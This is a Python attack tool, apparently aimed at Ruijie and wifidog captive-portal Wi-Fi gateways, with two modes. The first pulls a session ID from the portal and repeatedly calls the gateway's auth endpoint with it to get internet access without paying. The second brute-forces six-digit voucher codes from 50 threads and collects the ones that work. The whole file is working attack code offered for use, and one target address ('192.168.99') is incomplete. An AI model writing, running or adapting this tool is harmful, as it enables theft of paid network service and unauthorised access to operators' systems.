import requests, random, string, time, os, threading, re, sys, urllib3, argparse
from queue import Queue
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- COLORS ---
W, G, Y, R, B, C, M, D = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m", "\033[1;35m", "\033[2m"
RS = "\033[0m"

# --- GLOBAL VARS ---
stop_event = threading.Event()
valid_codes = []
total_tried = 0
total_hits = 0
current_target = "Searching..."

# --- UI FUNCTIONS ---
def Logo():
    os.system('clear')
    print(f"""{C}
 ██████  ███████ ██   ██ 
 ██   ██ ██       ██ ██  
 ██   ██ █████     ███   
 ██   ██ ██       ██ ██  
 ██████  ███████ ██   ██ 
 {W}───────────────────────
  {M}RUIJIE EXTREME ENGINE {G}v3.0{RS}
    """)

def Line():
    print(f"{C}──────────────────────────────────────────────────────────────{RS}")

# --- CORE ENGINE 1: TURBO BYPASS (From Script 1) ---
def turbo_ping(auth_link):
    s = requests.Session()
    while not stop_event.is_set():
        try:
            start = time.time()
            s.get(auth_link, timeout=5, verify=False)
            ms = (time.time() - start) * 1000
            sys.stdout.write(f"\r{W}[{G}✓{W}] {C}Turbo Pulse {W}| {G if ms < 100 else Y}{ms:.1f}ms{RS}        ")
            sys.stdout.flush()
        except: pass
        time.sleep(0.1)

def run_turbo_bypass():
    global current_target
    Logo(); Line()
    print(f"{Y}[*] Initializing Turbo Bypass Engine...{RS}")
    while not stop_event.is_set():
        try:
            r = requests.get("http://gstatic.com", allow_redirects=True, timeout=5)
            if r.status_code == 204:
                print(f"\r{G}[•] Internet Active. Monitoring...{RS}", end="")
                time.sleep(5); continue
            
            portal_url = r.url
            current_target = urlparse(portal_url).netloc
            print(f"\n{G}[✓] Portal Detected: {C}{current_target}{RS}")
            
            s = requests.Session()
            r1 = s.get(portal_url, verify=False)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, m.group(1)) if m else portal_url
            r2 = s.get(next_url, verify=False)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                params = parse_qs(urlparse(portal_url).query)
                gw = params.get('gw_address', ['192.168.99.1'])[0]
                port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print(f"{M}[*] Launching 8 Turbo Threads...{RS}")
                for _ in range(8):
                    threading.Thread(target=turbo_ping, args=(auth_link,), daemon=True).start()
                while True: time.sleep(10)
        except: time.sleep(2)

# --- CORE ENGINE 2: VOUCHER SCANNER (From Script 2) ---
session_pool = Queue()
def run_voucher_scanner():
    global total_tried, total_hits, current_target
    Logo(); Line()
    print(f"{Y}[*] Initializing Voucher Brute-Force...{RS}")
    
    def refiller():
        while not stop_event.is_set():
            if session_pool.qsize() < 20:
                try:
                    r = requests.get("http://gstatic.com", timeout=4)
                    m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                    f_url = urljoin(r.url, m.group(1)) if m else r.url
                    sid = parse_qs(urlparse(f_url).query).get('sessionId', [None])[0]
                    if sid: session_pool.put(sid)
                except: pass
            time.sleep(2)

    def worker():
        global total_tried, total_hits
        s = requests.Session()
        while not stop_event.is_set():
            try:
                sid = session_pool.get(timeout=2)
                code = ''.join(random.choices(string.digits, k=6))
                r = s.post("http://192.168.99", json={'accessCode':code, 'sessionId':sid, 'apiVersion':1}, timeout=3)
                total_tried += 1
                if "true" in r.text.lower():
                    total_hits += 1
                    valid_codes.append(code)
                session_pool.put(sid)
            except: pass

    threading.Thread(target=refiller, daemon=True).start()
    for _ in range(50): threading.Thread(target=worker, daemon=True).start()
    
    while not stop_event.is_set():
        sys.stdout.write(f"\r{W}Tried: {Y}{total_tried:,} {W}| Hits: {G}{total_hits} {W}| Pool: {C}{session_pool.qsize()}{RS}  ")
        sys.stdout.flush(); time.sleep(0.5)

# --- MAIN MENU SYSTEM ---
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup"], help="Select mode")
    args = parser.parse_args()

    if args.option == "setup":
        Logo(); Line()
        print(f"{G}[+] Installing requirements...{RS}")
        os.system("pip install requests urllib3 aiohttp ping3")
        print(f"{G}[+] Setup Completed!{RS}")
    
    elif args.option == "internet":
        Logo(); Line()
        print(f"{W}  [1] {G}Turbo Bypass Engine {D}(Auto SID Ping){RS}")
        print(f"{W}  [2] {G}Voucher Scanner {D}(Brute-Force Mode){RS}")
        Line()
        choice = input(f"{Y}Select Option (1/2): {RS}")
        
        if choice == "1": run_turbo_bypass()
        elif choice == "2": run_voucher_scanner()
        else: print(f"{R}Invalid Choice!{RS}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{R}[!] Stopped.{RS}")
